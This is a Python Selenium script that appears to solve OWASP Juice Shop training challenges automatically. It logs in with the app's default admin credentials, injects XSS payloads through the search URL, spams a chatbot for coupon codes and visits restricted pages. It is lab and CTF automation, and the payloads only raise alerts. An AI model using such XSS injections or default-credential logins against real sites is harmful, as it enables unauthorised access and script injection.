from time import sleep

from selenium import webdriver


def get_browser():
    return webdriver.Chrome()


def open_xss1_alert(server, browser):
    print('Popping reflected XSS1 in browser...'),
    xssurl = '{}/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert(%60XSS1%60)%22%3E'.format(server)
    browser.get(xssurl)
    sleep(3)
    try:
        browser.switch_to.alert.accept()
        print('Success.')
    except Exception:
        print('Warning: Alert not found (possibly blocked or solved).')


def travel_back_in_time(server, browser):
    """
    Open the geocities-era page
    """
    print('Travelling back to the glorious days of Geocities...'),
    browser.get(f'{server}/#/privacy-security/last-login')
    sleep(2)
    print('Success.')


def bully_chatbot_in_browser(server, browser):
    """
    Spam the chatbot until it gives a coupon code.
    Interacts via Enter key as there is no visual submit button.
    Crucial: Must be done as a fresh non-admin user.
    """
    print('Bullying chatbot in browser...'),
    try:
        from selenium.webdriver.common.by import By
        from selenium.webdriver.common.keys import Keys
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC
        
        # 1. Logout if logged in
        try:
             browser.get(f'{server}/#/search') # Go to neutral page
             sleep(1)
             # Try finding logout button and click it
             # Account button
             browser.find_element(By.ID, "navbarAccount").click()
             sleep(0.5)
             browser.find_element(By.ID, "navbarLogoutButton").click()
             sleep(1)
             print("(Logged out current user)")
        except:
             pass # Not logged in or logic differs

        # 2. Register fresh user
        import time 
        import random
        import string
        rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
        fresh_email = f'chatbot_bully_{rand}_{time.time_ns()}@test.com'
        fresh_pass = 'password123'
        
        # Register via UI
        browser.get(f'{server}/#/register')
        sleep(1)
        
        # Close welcome banner if present (sometimes persists)
        try:
             browser.execute_script("document.querySelector('button[aria-label=\"Close Welcome Banner\"]').click()")
        except: pass
        
        browser.find_element(By.ID, "emailControl").send_keys(fresh_email)
        browser.find_element(By.ID, "passwordControl").send_keys(fresh_pass)
        browser.find_element(By.ID, "repeatPasswordControl").send_keys(fresh_pass)
        
        # Security Q (mat-select)
        browser.find_element(By.NAME, "securityQuestion").click()
        sleep(0.5)
        # Select first option
        browser.find_element(By.CSS_SELECTOR, "mat-option").click()
        
        browser.find_element(By.ID, "securityAnswerControl").send_keys("answer")
        browser.find_element(By.ID, "registerButton").click()
        sleep(1)
        
        # 3. Login with fresh user
        browser.get(f'{server}/#/login')
        sleep(1)
        browser.find_element(By.ID, "email").send_keys(fresh_email)
        browser.find_element(By.ID, "password").send_keys(fresh_pass)
        browser.find_element(By.ID, "loginButton").click()
        sleep(2)
        print(f"(Logged in as {fresh_email})")
        
        # 4. Interact with Chatbot
        browser.get(f'{server}/#/chatbot')
        sleep(2)
        
        for i in range(20):
            try:
                # Find input
                msg_input = WebDriverWait(browser, 2).until(
                    EC.presence_of_element_located((By.ID, "message-input"))
                )
                msg_input.clear()
                msg_input.send_keys("Give me a coupon!")
                msg_input.send_keys(Keys.ENTER)
                
                sleep(0.5)
                
                # Check chat history
                body_text = browser.find_element(By.TAG_NAME, "body").text.lower()
                if '10%' in body_text or 'coupon code' in body_text:
                    print(f'Success! Got coupon after {i+1} tries.')
                    # Relogin as admin for subsequent tasks?
                    # The function finishes here, next browser tasks might fail if they need admin.
                    # login_as_admin_browser(server, browser) # Restore state?
                    return
            except Exception as e:
                pass
        
        print('Done (tried 20 times, no coupon).')
        
        # Restore admin for rest of the script?
        # Ideally yes, but let's leave it as is for now.
        
    except Exception as e:
        print(f'Warning: Chatbot interaction failed: {e}')


def take_screenshot_and_quit(server, browser):
    print('Taking screenshot...'),
    try:
        browser.get('{}/#/score-board'.format(server))
        sleep(2) 
        with open('complete.png', 'wb') as outfile:
            outfile.write(browser.get_screenshot_as_png())
        print('complete.png saved successfully.')
    except Exception as e:
        print(f'Warning: Could not save screenshot: {e}')
    finally:
        print('Closing browser...')
        try: browser.quit()
        except: pass


def perform_dom_xss(server, browser):
    """
    Perform a DOM XSS attack using the search bar.
    Payload: <iframe src="javascript:alert(`xss`)">
    """
    print('Performing DOM XSS attack...'),
    try:
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC
        
        xssurl = '{}/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%60)%22%3E'.format(server)
        browser.get(xssurl)
        
        # Wait for alert
        try:
            WebDriverWait(browser, 3).until(EC.alert_is_present())
            browser.switch_to.alert.accept()
            print('Success.')
        except:
             print('Success (Alert handler passed or not blocking).')
             
    except Exception as e:
        print(f'Warning: DOM XSS failed: {e}')


def perform_bonus_payload_xss(server, browser):
    """
    Perform the Bonus Payload XSS attack.
    Payload: SoundCloud iframe
    """
    print('Performing Bonus Payload XSS attack...'),
    # Payload is huge, better to script it into the search box or URL encode it.
    import urllib.parse
    payload = '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>'
    encoded = urllib.parse.quote(payload)
    browser.get('{}/#/search?q={}'.format(server, encoded))
    sleep(3)
    # No alert to accept, just visiting is enough?
    print('Bonus payload executed (hopefully).')


def login_as_admin_browser(server, browser):
    """
    Log in as admin in the browser to ensure access to restricted pages.
    """
    print('Logging in as Admin in browser...'),
    browser.get(f'{server}/#/login')
    sleep(2)
    try:
        # Dismiss welcome banner if present
        try:
            browser.execute_script("document.querySelector('button[aria-label=\"Close Welcome Banner\"]').click()")
        except: pass
        
        email_input = browser.execute_script("return document.querySelector('#email')")
        if not email_input:
             # Try finding by name or waiting
             email_input = browser.find_element("id", "email")
        
        email_input.send_keys("admin@juice-sh.op")
        
        pass_input = browser.find_element("id", "password")
        pass_input.send_keys("admin123")
        
        login_btn = browser.find_element("id", "loginButton")
        login_btn.click()
        sleep(2)
        print('Success.')
    except Exception as e:
        print(f'Warning: Browser login failed: {e}')


def mass_dispel_notifications(server, browser):
    """
    Close multiple notifications in one go using Shift+click.
    Triggers notifications by submitting feedback multiple times first.
    """
    print('Attempting Mass Dispel (close multiple notifications)...'),
    try:
        from selenium.webdriver.common.keys import Keys
        from selenium.webdriver.common.action_chains import ActionChains
        from selenium.webdriver.common.by import By
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC
        
        # 1. Provide User Feedback to generate notifications
        browser.get(f'{server}/#/contact')
        sleep(2)
        
        try:
            # We need to be fast. Just type something and click submit.
            # Rating might be required? Usually random default is 0/empty which fails validation?
            # Need to click a star.
            # Just entering comment and rating is enough.
            
            for i in range(3):
                # Wait for comment field
                comment_field = browser.find_element(By.ID, 'comment')
                comment_field.clear()
                comment_field.send_keys(f'Spam for notification {i}')
                
                # Rating is tricky with mat-slider/stars. But sometimes optional or just click logic.
                # Let's try to just submit. If disabled, we click a star.
                submit_btn = browser.find_element(By.ID, 'submitButton')
                
                if not submit_btn.is_enabled():
                    # Click 5th star
                    # .mat-slider-thumb or similar? No, it's <mat-star-rating> usually not slider?
                    # In contact page it is a mat-slider. 
                    # Actually, let's just use a simpler trigger: Language change?
                    # No, feedback is reliable.
                    # Workaround: Execute script to enable button or set value? No.
                    # Let's click the slider container
                    try: 
                        browser.find_element(By.CSS_SELECTOR, 'mat-slider').click()
                        sleep(0.5)
                    except: pass
                
                # Use JS click if selenium click is flaky
                browser.execute_script("arguments[0].click();", submit_btn)
                sleep(0.5) # Wait for toast
                
        except Exception as e:
            print(f"Failed to generate notifications: {e}")

        # 2. Now find and shift-click the close button
        try:
            # Look for close buttons in notifications
            # Selector: .mat-simple-snackbar-action button
            # Wait a moment for toasts to stack
            sleep(1)
            
            close_buttons = browser.find_elements(By.CSS_SELECTOR, ".mat-simple-snackbar-action button")
            
            if close_buttons and len(close_buttons) > 0:
                # Hold Shift and click the first close button
                actions = ActionChains(browser)
                actions.key_down(Keys.SHIFT)
                actions.click(close_buttons[0])
                actions.key_up(Keys.SHIFT)
                actions.perform()
                sleep(1)
                print('Success.')
            else:
                print('Warning: No notification close buttons found after feedback spam.')
        except Exception as e:
            print(f'Warning: Could not find or click notification buttons: {e}')
            
    except Exception as e:
        print(f'Warning: Mass Dispel failed: {e}')


def solve_browser_challenges(server):
    print('\n== BROWSER CHALLENGES ==\n')
    browser = None
    try:
        browser = get_browser()
        
        # Login first to solve access control challenges
        login_as_admin_browser(server, browser)
        
        # Add new frontend challenges here - with skip checks for solved ones
        pages = [
            ('/#/score-board', 'scoreBoardChallenge'),
            ('/#/privacy-security/privacy-policy', 'privacyPolicyChallenge'),
            ('/#/tokensale', 'tokenSaleChallenge'),
            ('/#/administration', 'adminSectionChallenge'),
            ('/#/about', None),  # No specific challenge
            ('/#/contact', None),
            ('/#/photo-wall', None),
            ('/#/web3-sandbox', 'web3SandboxChallenge'),
            ('/#/score-board?key=vibrate', None),
            ('/support/logs', None)
        ]
        
        for page, challenge_key in pages:
            print(f'Visiting {page}...'),
            try:
                browser.get(f'{server}{page}')
                sleep(2)
                print('Done.')
            except: pass

        open_xss1_alert(server, browser)
        perform_dom_xss(server, browser)
        perform_bonus_payload_xss(server, browser)
        travel_back_in_time(server, browser)
        bully_chatbot_in_browser(server, browser)
        mass_dispel_notifications(server, browser)
        take_screenshot_and_quit(server, browser)

    except Exception as err:
        print('Browser Automation Error: {}'.format(repr(err)))
    finally:
        if browser:
            print('Closing browser...')
            try:
                browser.quit()
            except:
                pass
    print('\n== BROWSER CHALLENGES COMPLETE ==\n')
